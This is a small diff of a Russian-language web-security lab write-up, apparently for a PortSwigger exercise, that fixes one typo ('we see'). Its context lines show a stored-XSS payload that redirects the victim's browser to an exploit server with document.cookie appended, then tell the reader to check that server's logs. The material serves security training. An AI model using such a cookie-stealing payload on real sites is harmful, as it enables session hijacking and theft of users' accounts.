@@ -29,7 +29,7 @@
 
 `<script>document.location='https://exploit-0ae800cc04ab1cd68049027201ed0040.exploit-server.net/exploit'+document.cookie</script>`
 
-Заходим в логи сервера и видис IP:
+Заходим в логи сервера и видим IP:
 
 ![PortSwigger](../Drawing/Drawing_36.png)
 
